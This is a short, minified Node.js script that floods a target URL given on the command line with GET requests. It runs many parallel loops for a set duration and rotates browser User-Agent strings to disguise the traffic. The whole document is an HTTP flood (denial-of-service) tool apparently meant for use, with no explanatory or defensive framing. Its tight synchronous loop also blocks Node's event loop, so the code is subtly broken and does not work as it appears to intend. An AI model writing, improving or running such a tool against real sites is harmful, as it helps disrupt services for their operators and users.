var https=require('https'),http=require('http'),url=require('url');
var t=process.argv[2],th=parseInt(process.argv[3])||100,dr=parseInt(process.argv[4])||60;
if(!t)process.exit(1);
var u=url.parse(t),s=u.protocol==='https:'?https:http;
var ua=['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'];
var running=true;setTimeout(function(){running=false},dr*1000);
function f(){while(running){try{s.get({hostname:u.hostname,path:'/',headers:{'User-Agent':ua[Math.floor(Math.random()*2)]}},function(){})}catch(e){}}}
for(var i=0;i<th;i++)f();
